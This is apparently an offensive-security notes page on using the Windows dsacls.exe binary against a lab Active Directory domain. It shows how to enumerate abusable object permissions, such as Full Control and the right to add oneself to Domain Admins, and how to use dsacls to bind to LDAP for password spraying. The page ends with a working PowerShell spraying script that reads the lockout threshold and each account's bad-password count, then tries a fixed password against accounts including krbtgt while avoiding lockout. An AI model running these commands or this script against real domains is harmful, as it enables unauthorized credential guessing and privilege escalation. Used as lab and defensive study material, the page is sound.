---
description: 'Enumeration, living off the land'
---

# Using dsacls to check AD Object Permissions

It is possible to use a native windows binary \(in addition to powershell cmdlet `Get-Acl`\) to enumerate Active Directory object security persmissions. The binary of interest is `dsacls.exe`.

Dsacls allows us to display or modify permissions \(ACLS\) of an Active Directory Domain Services \(AD DS\).

## Execution

Let's check if the user spot has any special permissions against the user spotless:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "spot"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Nothing useful:

![](../../.gitbook/assets/screenshot-from-2019-03-19-22-46-47.png)

Let's give user spot `Reset Password` and `Change Password` permissions on `spotless` AD object:

![](../../.gitbook/assets/screenshot-from-2019-03-19-22-46-04.png)

...let's try the command again:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "spot"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2019-03-19-22-44-21.png)

### Full Control

All well known \(and abusable\) AD object permissions should be sought here. One of them is `FULL CONTROL`:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "full control"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2019-03-19-22-54-36.png)

### Add/Remove self as member

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" | select-string "spotless"
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2019-03-19-22-57-50.png)

### WriteProperty/ChangeOwnerShip

![](../../.gitbook/assets/screenshot-from-2019-03-19-23-00-04.png)

For more good privileges to be abused:

{% page-ref page="privileged-accounts-and-token-privileges.md" %}

{% page-ref page="abusing-active-directory-acls-aces.md" %}

## Password Spraying Anyone?

As a side note, the `dsacls` binary could be used to do LDAP password spraying as it allows us to bind to LDAP with a specified username and password:

{% code-tabs %}
{% code-tabs-item title="incorrect logon" %}
```csharp
dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:spotless@offense.local /passwd:1234567
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![Logon Failure](../../.gitbook/assets/screenshot-from-2019-03-19-23-09-12.png)

{% code-tabs %}
{% code-tabs-item title="correct logon" %}
```csharp
dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:spotless@offense.local /passwd:123456
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![Logon Successful](../../.gitbook/assets/screenshot-from-2019-03-19-23-09-59.png)

### Dirty POC idea for Password Spraying:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
$domain = ((cmd /c set u)[-3] -split "=")[-1]
$pdc = ((nltest.exe /dcname:$domain) -split "\\\\")[1]
$lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1]
$password = "123456"

"krbtgt","spotless" | % {
    $badPwdCount = Get-ADObject -SearchBase "cn=$_,cn=users,dc=$domain,dc=local" -Filter * -Properties badpwdcount -Server $pdc | Select-Object -ExpandProperty badpwdcount
    if ($badPwdCount -lt $lockoutBadPwdCount - 3) {
        $isInvalid = dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:$_@offense.local /passwd:$password | select-string -pattern "Invalid Credentials"
        if ($isInvalid -match "Invalid") {
            Write-Host "[-] Invalid Credentials for $_ : $password" -foreground red
        } else {
            Write-Host "[+] Working Credentials for $_ : $password" -foreground green
        }        
    }
}
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2019-03-20-00-10-10.png)

## References

{% embed url="https://devblogs.microsoft.com/scripting/use-powershell-to-explore-active-directory-security/" %}


